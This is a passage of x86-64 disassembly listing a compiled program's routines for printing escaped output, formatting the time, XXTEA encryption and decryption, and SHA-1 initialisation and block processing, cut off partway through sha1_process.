  402c13:	bf 74 00 00 00       	mov    $0x74,%edi
  402c18:	e8 b3 e1 ff ff       	callq  400dd0 <putchar@plt>
  402c1d:	eb 44                	jmp    402c63 <__print_output+0xd9>
  402c1f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c23:	0f b6 00             	movzbl (%rax),%eax
  402c26:	84 c0                	test   %al,%al
  402c28:	78 0b                	js     402c35 <__print_output+0xab>
  402c2a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c2e:	0f b6 00             	movzbl (%rax),%eax
  402c31:	3c 1f                	cmp    $0x1f,%al
  402c33:	77 1d                	ja     402c52 <__print_output+0xc8>
  402c35:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c39:	0f b6 00             	movzbl (%rax),%eax
  402c3c:	0f b6 c0             	movzbl %al,%eax
  402c3f:	89 c6                	mov    %eax,%esi
  402c41:	bf b6 7b 40 00       	mov    $0x407bb6,%edi
  402c46:	b8 00 00 00 00       	mov    $0x0,%eax
  402c4b:	e8 20 e2 ff ff       	callq  400e70 <printf@plt>
  402c50:	eb 11                	jmp    402c63 <__print_output+0xd9>
  402c52:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c56:	0f b6 00             	movzbl (%rax),%eax
  402c59:	0f b6 c0             	movzbl %al,%eax
  402c5c:	89 c7                	mov    %eax,%edi
  402c5e:	e8 6d e1 ff ff       	callq  400dd0 <putchar@plt>
  402c63:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
  402c67:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
  402c6c:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402c6f:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
  402c73:	0f 82 40 ff ff ff    	jb     402bb9 <__print_output+0x2f>
  402c79:	bf 0a 00 00 00       	mov    $0xa,%edi
  402c7e:	e8 4d e1 ff ff       	callq  400dd0 <putchar@plt>
  402c83:	c9                   	leaveq 
  402c84:	c3                   	retq   

0000000000402c85 <pretty_time>:
  402c85:	55                   	push   %rbp
  402c86:	48 89 e5             	mov    %rsp,%rbp
  402c89:	48 83 ec 60          	sub    $0x60,%rsp
  402c8d:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
  402c91:	bf 00 00 00 00       	mov    $0x0,%edi
  402c96:	e8 f5 e2 ff ff       	callq  400f90 <time@plt>
  402c9b:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  402c9f:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
  402ca3:	48 8d 45 b8          	lea    -0x48(%rbp),%rax
  402ca7:	48 89 d6             	mov    %rdx,%rsi
  402caa:	48 89 c7             	mov    %rax,%rdi
  402cad:	e8 ee e1 ff ff       	callq  400ea0 <gmtime_r@plt>
  402cb2:	8b 75 c0             	mov    -0x40(%rbp),%esi
  402cb5:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
  402cb8:	8b 55 c8             	mov    -0x38(%rbp),%edx
  402cbb:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  402cbf:	41 89 f1             	mov    %esi,%r9d
  402cc2:	41 89 c8             	mov    %ecx,%r8d
  402cc5:	89 d1                	mov    %edx,%ecx
  402cc7:	ba c0 7b 40 00       	mov    $0x407bc0,%edx
  402ccc:	be 09 00 00 00       	mov    $0x9,%esi
  402cd1:	48 89 c7             	mov    %rax,%rdi
  402cd4:	b8 00 00 00 00       	mov    $0x0,%eax
  402cd9:	e8 a2 e1 ff ff       	callq  400e80 <snprintf@plt>
  402cde:	c9                   	leaveq 
  402cdf:	c3                   	retq   

0000000000402ce0 <XXTEA_Encrypt>:
  402ce0:	55                   	push   %rbp
  402ce1:	48 89 e5             	mov    %rsp,%rbp
  402ce4:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  402ce8:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
  402cec:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  402cf0:	b8 34 00 00 00       	mov    $0x34,%eax
  402cf5:	ba 00 00 00 00       	mov    $0x0,%edx
  402cfa:	48 f7 75 d0          	divq   -0x30(%rbp)
  402cfe:	83 c0 06             	add    $0x6,%eax
  402d01:	89 45 e8             	mov    %eax,-0x18(%rbp)
  402d04:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
  402d0b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402d0f:	48 c1 e0 02          	shl    $0x2,%rax
  402d13:	48 8d 50 fc          	lea    -0x4(%rax),%rdx
  402d17:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402d1b:	48 01 d0             	add    %rdx,%rax
  402d1e:	8b 00                	mov    (%rax),%eax
  402d20:	89 45 f0             	mov    %eax,-0x10(%rbp)
  402d23:	81 6d ec 47 86 c8 61 	subl   $0x61c88647,-0x14(%rbp)
  402d2a:	8b 45 ec             	mov    -0x14(%rbp),%eax
  402d2d:	c1 e8 02             	shr    $0x2,%eax
  402d30:	83 e0 03             	and    $0x3,%eax
  402d33:	89 45 f8             	mov    %eax,-0x8(%rbp)
  402d36:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
  402d3d:	e9 9d 00 00 00       	jmpq   402ddf <XXTEA_Encrypt+0xff>
  402d42:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402d45:	83 c0 01             	add    $0x1,%eax
  402d48:	89 c0                	mov    %eax,%eax
  402d4a:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402d51:	00 
  402d52:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402d56:	48 01 d0             	add    %rdx,%rax
  402d59:	8b 00                	mov    (%rax),%eax
  402d5b:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402d5e:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402d61:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402d68:	00 
  402d69:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402d6d:	48 01 d0             	add    %rdx,%rax
  402d70:	8b 55 f4             	mov    -0xc(%rbp),%edx
  402d73:	48 8d 0c 95 00 00 00 	lea    0x0(,%rdx,4),%rcx
  402d7a:	00 
  402d7b:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  402d7f:	48 01 ca             	add    %rcx,%rdx
  402d82:	8b 0a                	mov    (%rdx),%ecx
  402d84:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402d87:	89 d6                	mov    %edx,%esi
  402d89:	c1 ee 05             	shr    $0x5,%esi
  402d8c:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402d8f:	c1 e2 02             	shl    $0x2,%edx
  402d92:	31 d6                	xor    %edx,%esi
  402d94:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402d97:	89 d7                	mov    %edx,%edi
  402d99:	c1 ef 03             	shr    $0x3,%edi
  402d9c:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402d9f:	c1 e2 04             	shl    $0x4,%edx
  402da2:	31 fa                	xor    %edi,%edx
  402da4:	8d 3c 16             	lea    (%rsi,%rdx,1),%edi
  402da7:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402daa:	8b 75 ec             	mov    -0x14(%rbp),%esi
  402dad:	31 d6                	xor    %edx,%esi
  402daf:	8b 55 f4             	mov    -0xc(%rbp),%edx
  402db2:	83 e2 03             	and    $0x3,%edx
  402db5:	33 55 f8             	xor    -0x8(%rbp),%edx
  402db8:	89 d2                	mov    %edx,%edx
  402dba:	4c 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%r8
  402dc1:	00 
  402dc2:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  402dc6:	4c 01 c2             	add    %r8,%rdx
  402dc9:	8b 12                	mov    (%rdx),%edx
  402dcb:	33 55 f0             	xor    -0x10(%rbp),%edx
  402dce:	01 f2                	add    %esi,%edx
  402dd0:	31 fa                	xor    %edi,%edx
  402dd2:	01 ca                	add    %ecx,%edx
  402dd4:	89 10                	mov    %edx,(%rax)
  402dd6:	8b 00                	mov    (%rax),%eax
  402dd8:	89 45 f0             	mov    %eax,-0x10(%rbp)
  402ddb:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
  402ddf:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402de2:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  402de6:	48 83 ea 01          	sub    $0x1,%rdx
  402dea:	48 39 d0             	cmp    %rdx,%rax
  402ded:	0f 82 4f ff ff ff    	jb     402d42 <XXTEA_Encrypt+0x62>
  402df3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402df7:	8b 00                	mov    (%rax),%eax
  402df9:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402dfc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402e00:	48 c1 e0 02          	shl    $0x2,%rax
  402e04:	48 8d 50 fc          	lea    -0x4(%rax),%rdx
  402e08:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402e0c:	48 01 d0             	add    %rdx,%rax
  402e0f:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  402e13:	48 c1 e2 02          	shl    $0x2,%rdx
  402e17:	48 8d 4a fc          	lea    -0x4(%rdx),%rcx
  402e1b:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  402e1f:	48 01 ca             	add    %rcx,%rdx
  402e22:	8b 0a                	mov    (%rdx),%ecx
  402e24:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402e27:	89 d6                	mov    %edx,%esi
  402e29:	c1 ee 05             	shr    $0x5,%esi
  402e2c:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402e2f:	c1 e2 02             	shl    $0x2,%edx
  402e32:	31 d6                	xor    %edx,%esi
  402e34:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402e37:	89 d7                	mov    %edx,%edi
  402e39:	c1 ef 03             	shr    $0x3,%edi
  402e3c:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402e3f:	c1 e2 04             	shl    $0x4,%edx
  402e42:	31 fa                	xor    %edi,%edx
  402e44:	8d 3c 16             	lea    (%rsi,%rdx,1),%edi
  402e47:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402e4a:	8b 75 ec             	mov    -0x14(%rbp),%esi
  402e4d:	31 d6                	xor    %edx,%esi
  402e4f:	8b 55 f4             	mov    -0xc(%rbp),%edx
  402e52:	83 e2 03             	and    $0x3,%edx
  402e55:	33 55 f8             	xor    -0x8(%rbp),%edx
  402e58:	89 d2                	mov    %edx,%edx
  402e5a:	4c 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%r8
  402e61:	00 
  402e62:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  402e66:	4c 01 c2             	add    %r8,%rdx
  402e69:	8b 12                	mov    (%rdx),%edx
  402e6b:	33 55 f0             	xor    -0x10(%rbp),%edx
  402e6e:	01 f2                	add    %esi,%edx
  402e70:	31 fa                	xor    %edi,%edx
  402e72:	01 ca                	add    %ecx,%edx
  402e74:	89 10                	mov    %edx,(%rax)
  402e76:	8b 00                	mov    (%rax),%eax
  402e78:	89 45 f0             	mov    %eax,-0x10(%rbp)
  402e7b:	83 6d e8 01          	subl   $0x1,-0x18(%rbp)
  402e7f:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
  402e83:	0f 85 9a fe ff ff    	jne    402d23 <XXTEA_Encrypt+0x43>
  402e89:	5d                   	pop    %rbp
  402e8a:	c3                   	retq   

0000000000402e8b <XXTEA_Decrypt>:
  402e8b:	55                   	push   %rbp
  402e8c:	48 89 e5             	mov    %rsp,%rbp
  402e8f:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  402e93:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
  402e97:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  402e9b:	b8 34 00 00 00       	mov    $0x34,%eax
  402ea0:	ba 00 00 00 00       	mov    $0x0,%edx
  402ea5:	48 f7 75 d0          	divq   -0x30(%rbp)
  402ea9:	83 c0 06             	add    $0x6,%eax
  402eac:	89 45 f4             	mov    %eax,-0xc(%rbp)
  402eaf:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402eb2:	69 c0 b9 79 37 9e    	imul   $0x9e3779b9,%eax,%eax
  402eb8:	89 45 e8             	mov    %eax,-0x18(%rbp)
  402ebb:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402ebf:	8b 00                	mov    (%rax),%eax
  402ec1:	89 45 ec             	mov    %eax,-0x14(%rbp)
  402ec4:	8b 45 e8             	mov    -0x18(%rbp),%eax
  402ec7:	c1 e8 02             	shr    $0x2,%eax
  402eca:	83 e0 03             	and    $0x3,%eax
  402ecd:	89 45 f8             	mov    %eax,-0x8(%rbp)
  402ed0:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402ed4:	83 e8 01             	sub    $0x1,%eax
  402ed7:	89 45 f0             	mov    %eax,-0x10(%rbp)
  402eda:	e9 9f 00 00 00       	jmpq   402f7e <XXTEA_Decrypt+0xf3>
  402edf:	8b 45 f0             	mov    -0x10(%rbp),%eax
  402ee2:	83 e8 01             	sub    $0x1,%eax
  402ee5:	89 c0                	mov    %eax,%eax
  402ee7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402eee:	00 
  402eef:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402ef3:	48 01 d0             	add    %rdx,%rax
  402ef6:	8b 00                	mov    (%rax),%eax
  402ef8:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402efb:	8b 45 f0             	mov    -0x10(%rbp),%eax
  402efe:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402f05:	00 
  402f06:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402f0a:	48 01 d0             	add    %rdx,%rax
  402f0d:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402f10:	48 8d 0c 95 00 00 00 	lea    0x0(,%rdx,4),%rcx
  402f17:	00 
  402f18:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  402f1c:	48 01 ca             	add    %rcx,%rdx
  402f1f:	8b 0a                	mov    (%rdx),%ecx
  402f21:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402f24:	89 d6                	mov    %edx,%esi
  402f26:	c1 ee 05             	shr    $0x5,%esi
  402f29:	8b 55 ec             	mov    -0x14(%rbp),%edx
  402f2c:	c1 e2 02             	shl    $0x2,%edx
  402f2f:	31 d6                	xor    %edx,%esi
  402f31:	8b 55 ec             	mov    -0x14(%rbp),%edx
  402f34:	89 d7                	mov    %edx,%edi
  402f36:	c1 ef 03             	shr    $0x3,%edi
  402f39:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402f3c:	c1 e2 04             	shl    $0x4,%edx
  402f3f:	31 fa                	xor    %edi,%edx
  402f41:	8d 3c 16             	lea    (%rsi,%rdx,1),%edi
  402f44:	8b 55 ec             	mov    -0x14(%rbp),%edx
  402f47:	8b 75 e8             	mov    -0x18(%rbp),%esi
  402f4a:	31 d6                	xor    %edx,%esi
  402f4c:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402f4f:	83 e2 03             	and    $0x3,%edx
  402f52:	33 55 f8             	xor    -0x8(%rbp),%edx
  402f55:	89 d2                	mov    %edx,%edx
  402f57:	4c 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%r8
  402f5e:	00 
  402f5f:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  402f63:	4c 01 c2             	add    %r8,%rdx
  402f66:	8b 12                	mov    (%rdx),%edx
  402f68:	33 55 fc             	xor    -0x4(%rbp),%edx
  402f6b:	01 f2                	add    %esi,%edx
  402f6d:	31 fa                	xor    %edi,%edx
  402f6f:	29 d1                	sub    %edx,%ecx
  402f71:	89 ca                	mov    %ecx,%edx
  402f73:	89 10                	mov    %edx,(%rax)
  402f75:	8b 00                	mov    (%rax),%eax
  402f77:	89 45 ec             	mov    %eax,-0x14(%rbp)
  402f7a:	83 6d f0 01          	subl   $0x1,-0x10(%rbp)
  402f7e:	83 7d f0 00          	cmpl   $0x0,-0x10(%rbp)
  402f82:	0f 85 57 ff ff ff    	jne    402edf <XXTEA_Decrypt+0x54>
  402f88:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402f8c:	48 c1 e0 02          	shl    $0x2,%rax
  402f90:	48 8d 50 fc          	lea    -0x4(%rax),%rdx
  402f94:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402f98:	48 01 d0             	add    %rdx,%rax
  402f9b:	8b 00                	mov    (%rax),%eax
  402f9d:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402fa0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402fa4:	8b 10                	mov    (%rax),%edx
  402fa6:	8b 45 fc             	mov    -0x4(%rbp),%eax
  402fa9:	c1 e8 05             	shr    $0x5,%eax
  402fac:	89 c1                	mov    %eax,%ecx
  402fae:	8b 45 ec             	mov    -0x14(%rbp),%eax
  402fb1:	c1 e0 02             	shl    $0x2,%eax
  402fb4:	31 c1                	xor    %eax,%ecx
  402fb6:	8b 45 ec             	mov    -0x14(%rbp),%eax
  402fb9:	c1 e8 03             	shr    $0x3,%eax
  402fbc:	89 c6                	mov    %eax,%esi
  402fbe:	8b 45 fc             	mov    -0x4(%rbp),%eax
  402fc1:	c1 e0 04             	shl    $0x4,%eax
  402fc4:	31 f0                	xor    %esi,%eax
  402fc6:	8d 34 01             	lea    (%rcx,%rax,1),%esi
  402fc9:	8b 45 ec             	mov    -0x14(%rbp),%eax
  402fcc:	8b 4d e8             	mov    -0x18(%rbp),%ecx
  402fcf:	31 c1                	xor    %eax,%ecx
  402fd1:	8b 45 f0             	mov    -0x10(%rbp),%eax
  402fd4:	83 e0 03             	and    $0x3,%eax
  402fd7:	33 45 f8             	xor    -0x8(%rbp),%eax
  402fda:	89 c0                	mov    %eax,%eax
  402fdc:	48 8d 3c 85 00 00 00 	lea    0x0(,%rax,4),%rdi
  402fe3:	00 
  402fe4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  402fe8:	48 01 f8             	add    %rdi,%rax
  402feb:	8b 00                	mov    (%rax),%eax
  402fed:	33 45 fc             	xor    -0x4(%rbp),%eax
  402ff0:	01 c8                	add    %ecx,%eax
  402ff2:	31 f0                	xor    %esi,%eax
  402ff4:	29 c2                	sub    %eax,%edx
  402ff6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402ffa:	89 10                	mov    %edx,(%rax)
  402ffc:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  403000:	8b 00                	mov    (%rax),%eax
  403002:	89 45 ec             	mov    %eax,-0x14(%rbp)
  403005:	81 45 e8 47 86 c8 61 	addl   $0x61c88647,-0x18(%rbp)
  40300c:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
  403010:	0f 85 ae fe ff ff    	jne    402ec4 <XXTEA_Decrypt+0x39>
  403016:	5d                   	pop    %rbp
  403017:	c3                   	retq   

0000000000403018 <sha1_starts>:
  403018:	55                   	push   %rbp
  403019:	48 89 e5             	mov    %rsp,%rbp
  40301c:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  403020:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403024:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40302b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40302f:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
  403036:	00 
  403037:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40303b:	48 c7 40 10 01 23 45 	movq   $0x67452301,0x10(%rax)
  403042:	67 
  403043:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403047:	ba 89 ab cd ef       	mov    $0xefcdab89,%edx
  40304c:	48 89 50 18          	mov    %rdx,0x18(%rax)
  403050:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403054:	b9 fe dc ba 98       	mov    $0x98badcfe,%ecx
  403059:	48 89 48 20          	mov    %rcx,0x20(%rax)
  40305d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403061:	48 c7 40 28 76 54 32 	movq   $0x10325476,0x28(%rax)
  403068:	10 
  403069:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40306d:	be f0 e1 d2 c3       	mov    $0xc3d2e1f0,%esi
  403072:	48 89 70 30          	mov    %rsi,0x30(%rax)
  403076:	5d                   	pop    %rbp
  403077:	c3                   	retq   

0000000000403078 <sha1_process>:
  403078:	55                   	push   %rbp
  403079:	48 89 e5             	mov    %rsp,%rbp
  40307c:	48 83 ec 48          	sub    $0x48,%rsp
  403080:	48 89 bd 48 ff ff ff 	mov    %rdi,-0xb8(%rbp)
  403087:	48 89 b5 40 ff ff ff 	mov    %rsi,-0xc0(%rbp)
  40308e:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403095:	0f b6 00             	movzbl (%rax),%eax
  403098:	0f b6 c0             	movzbl %al,%eax
  40309b:	48 c1 e0 18          	shl    $0x18,%rax
  40309f:	48 89 c2             	mov    %rax,%rdx
  4030a2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4030a9:	48 83 c0 01          	add    $0x1,%rax
  4030ad:	0f b6 00             	movzbl (%rax),%eax
  4030b0:	0f b6 c0             	movzbl %al,%eax
  4030b3:	48 c1 e0 10          	shl    $0x10,%rax
  4030b7:	48 09 c2             	or     %rax,%rdx
  4030ba:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4030c1:	48 83 c0 02          	add    $0x2,%rax
  4030c5:	0f b6 00             	movzbl (%rax),%eax
  4030c8:	0f b6 c0             	movzbl %al,%eax
  4030cb:	48 c1 e0 08          	shl    $0x8,%rax
  4030cf:	48 09 c2             	or     %rax,%rdx
  4030d2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4030d9:	48 83 c0 03          	add    $0x3,%rax
  4030dd:	0f b6 00             	movzbl (%rax),%eax
  4030e0:	0f b6 c0             	movzbl %al,%eax
  4030e3:	48 09 d0             	or     %rdx,%rax
  4030e6:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4030ea:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4030f1:	48 83 c0 04          	add    $0x4,%rax
  4030f5:	0f b6 00             	movzbl (%rax),%eax
  4030f8:	0f b6 c0             	movzbl %al,%eax
  4030fb:	48 c1 e0 18          	shl    $0x18,%rax
  4030ff:	48 89 c2             	mov    %rax,%rdx
  403102:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403109:	48 83 c0 05          	add    $0x5,%rax
  40310d:	0f b6 00             	movzbl (%rax),%eax
  403110:	0f b6 c0             	movzbl %al,%eax
  403113:	48 c1 e0 10          	shl    $0x10,%rax
  403117:	48 09 c2             	or     %rax,%rdx
  40311a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403121:	48 83 c0 06          	add    $0x6,%rax
  403125:	0f b6 00             	movzbl (%rax),%eax
  403128:	0f b6 c0             	movzbl %al,%eax
  40312b:	48 c1 e0 08          	shl    $0x8,%rax
  40312f:	48 09 c2             	or     %rax,%rdx
  403132:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403139:	48 83 c0 07          	add    $0x7,%rax
  40313d:	0f b6 00             	movzbl (%rax),%eax
  403140:	0f b6 c0             	movzbl %al,%eax
  403143:	48 09 d0             	or     %rdx,%rax
  403146:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  40314a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403151:	48 83 c0 08          	add    $0x8,%rax
  403155:	0f b6 00             	movzbl (%rax),%eax
  403158:	0f b6 c0             	movzbl %al,%eax
  40315b:	48 c1 e0 18          	shl    $0x18,%rax
  40315f:	48 89 c2             	mov    %rax,%rdx
  403162:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403169:	48 83 c0 09          	add    $0x9,%rax
  40316d:	0f b6 00             	movzbl (%rax),%eax
  403170:	0f b6 c0             	movzbl %al,%eax
  403173:	48 c1 e0 10          	shl    $0x10,%rax
  403177:	48 09 c2             	or     %rax,%rdx
  40317a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403181:	48 83 c0 0a          	add    $0xa,%rax
  403185:	0f b6 00             	movzbl (%rax),%eax
  403188:	0f b6 c0             	movzbl %al,%eax
  40318b:	48 c1 e0 08          	shl    $0x8,%rax
  40318f:	48 09 c2             	or     %rax,%rdx
  403192:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403199:	48 83 c0 0b          	add    $0xb,%rax
  40319d:	0f b6 00             	movzbl (%rax),%eax
  4031a0:	0f b6 c0             	movzbl %al,%eax
  4031a3:	48 09 d0             	or     %rdx,%rax
  4031a6:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  4031aa:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4031b1:	48 83 c0 0c          	add    $0xc,%rax
  4031b5:	0f b6 00             	movzbl (%rax),%eax
  4031b8:	0f b6 c0             	movzbl %al,%eax
  4031bb:	48 c1 e0 18          	shl    $0x18,%rax
  4031bf:	48 89 c2             	mov    %rax,%rdx
  4031c2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4031c9:	48 83 c0 0d          	add    $0xd,%rax
  4031cd:	0f b6 00             	movzbl (%rax),%eax
  4031d0:	0f b6 c0             	movzbl %al,%eax
  4031d3:	48 c1 e0 10          	shl    $0x10,%rax
  4031d7:	48 09 c2             	or     %rax,%rdx
  4031da:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4031e1:	48 83 c0 0e          	add    $0xe,%rax
  4031e5:	0f b6 00             	movzbl (%rax),%eax
  4031e8:	0f b6 c0             	movzbl %al,%eax
  4031eb:	48 c1 e0 08          	shl    $0x8,%rax
  4031ef:	48 09 c2             	or     %rax,%rdx
  4031f2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4031f9:	48 83 c0 0f          	add    $0xf,%rax
  4031fd:	0f b6 00             	movzbl (%rax),%eax
  403200:	0f b6 c0             	movzbl %al,%eax
  403203:	48 09 d0             	or     %rdx,%rax
  403206:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  40320a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403211:	48 83 c0 10          	add    $0x10,%rax
  403215:	0f b6 00             	movzbl (%rax),%eax
  403218:	0f b6 c0             	movzbl %al,%eax
  40321b:	48 c1 e0 18          	shl    $0x18,%rax
  40321f:	48 89 c2             	mov    %rax,%rdx
  403222:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403229:	48 83 c0 11          	add    $0x11,%rax
  40322d:	0f b6 00             	movzbl (%rax),%eax
  403230:	0f b6 c0             	movzbl %al,%eax
  403233:	48 c1 e0 10          	shl    $0x10,%rax
  403237:	48 09 c2             	or     %rax,%rdx
  40323a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403241:	48 83 c0 12          	add    $0x12,%rax
  403245:	0f b6 00             	movzbl (%rax),%eax
  403248:	0f b6 c0             	movzbl %al,%eax
  40324b:	48 c1 e0 08          	shl    $0x8,%rax
  40324f:	48 09 c2             	or     %rax,%rdx
  403252:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403259:	48 83 c0 13          	add    $0x13,%rax
  40325d:	0f b6 00             	movzbl (%rax),%eax
  403260:	0f b6 c0             	movzbl %al,%eax
  403263:	48 09 d0             	or     %rdx,%rax
  403266:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  40326a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403271:	48 83 c0 14          	add    $0x14,%rax
  403275:	0f b6 00             	movzbl (%rax),%eax
  403278:	0f b6 c0             	movzbl %al,%eax
  40327b:	48 c1 e0 18          	shl    $0x18,%rax
  40327f:	48 89 c2             	mov    %rax,%rdx
  403282:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403289:	48 83 c0 15          	add    $0x15,%rax
  40328d:	0f b6 00             	movzbl (%rax),%eax
  403290:	0f b6 c0             	movzbl %al,%eax
  403293:	48 c1 e0 10          	shl    $0x10,%rax
  403297:	48 09 c2             	or     %rax,%rdx
  40329a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4032a1:	48 83 c0 16          	add    $0x16,%rax
  4032a5:	0f b6 00             	movzbl (%rax),%eax
  4032a8:	0f b6 c0             	movzbl %al,%eax
  4032ab:	48 c1 e0 08          	shl    $0x8,%rax
  4032af:	48 09 c2             	or     %rax,%rdx
  4032b2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4032b9:	48 83 c0 17          	add    $0x17,%rax
  4032bd:	0f b6 00             	movzbl (%rax),%eax
  4032c0:	0f b6 c0             	movzbl %al,%eax
  4032c3:	48 09 d0             	or     %rdx,%rax
  4032c6:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  4032ca:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4032d1:	48 83 c0 18          	add    $0x18,%rax
  4032d5:	0f b6 00             	movzbl (%rax),%eax
  4032d8:	0f b6 c0             	movzbl %al,%eax
  4032db:	48 c1 e0 18          	shl    $0x18,%rax
  4032df:	48 89 c2             	mov    %rax,%rdx
  4032e2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4032e9:	48 83 c0 19          	add    $0x19,%rax
  4032ed:	0f b6 00             	movzbl (%rax),%eax
